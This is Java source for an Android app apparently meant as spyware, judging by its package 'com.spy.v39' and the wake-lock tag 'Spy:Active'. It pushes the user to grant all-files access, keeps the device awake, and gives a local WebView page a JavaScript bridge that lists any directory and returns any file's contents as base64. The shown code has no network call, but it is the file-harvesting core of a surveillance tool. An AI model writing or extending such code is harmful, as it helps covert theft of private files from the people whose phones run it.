package com.spy.v39;
import android.os.*; import android.webkit.*; import android.app.*; import android.content.*; import android.net.Uri; import android.provider.Settings; import java.io.File; import android.util.Base64;
public class MainActivity extends Activity {
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())));
        }
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:Active").acquire();
        
        WebView w = new WebView(this);
        w.getSettings().setJavaScriptEnabled(true);
        w.getSettings().setAllowFileAccess(true);
        w.getSettings().setAllowUniversalAccessFromFileURLs(true);
        w.addJavascriptInterface(new Object() {
            @JavascriptInterface public String list(String path) {
                try { File f = new File(path); File[] files = f.listFiles(); StringBuilder sb = new StringBuilder();
                if(files == null) return "Locked";
                for (File file : files) sb.append(file.isDirectory() ? "📁 " : "📄 ").append(file.getName()).append("\n");
                return sb.toString(); } catch (Exception e) { return "Empty"; }
            }
            @JavascriptInterface public String getFileBase64(String path) {
                try { byte[] b = java.nio.file.Files.readAllBytes(new File(path).toPath());
                return Base64.encodeToString(b, Base64.NO_WRAP); } catch (Exception e) { return "Error"; }
            }
        }, "Android");
        w.loadUrl("file:///android_asset/index.html");
        setContentView(w);
    }
}